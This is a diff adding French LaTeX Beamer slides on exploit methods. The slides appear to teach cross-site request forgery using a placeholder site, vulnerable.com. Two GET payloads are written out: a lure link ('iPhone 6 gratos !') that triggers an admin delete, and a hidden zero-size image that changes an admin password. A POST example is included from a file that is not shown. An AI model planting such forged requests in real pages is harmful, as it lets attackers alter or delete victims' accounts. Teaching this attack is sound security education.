@@ -1,0 +1,31 @@
+\section{Les méthodes d'exploit}
+
+\frame{\tableofcontents[currentsection]}
+
+\begin{frame}
+
+\begin{block}{GET}
+
+\begin{itemize}
+
+\item Un simple lien: \\
+<a href="\url{http://vulnerable.com?user=ADMIN&delete=1"}>\\
+iPhone 6 gratos !</a>
+
+\item Une image de taille nulle: \\
+<img src="\url{http://vulnerable.com?user=ADMIN&passwd=1234"}\\
+ width="0" height="0" border="0">
+
+\end{itemize}
+
+\end{block}
+
+\end{frame}
+
+
+\begin{frame}
+\begin{block}{POST}
+	\lstinputlisting[language=HTML]{post.html}
+\end{block}
+\end{frame}
+
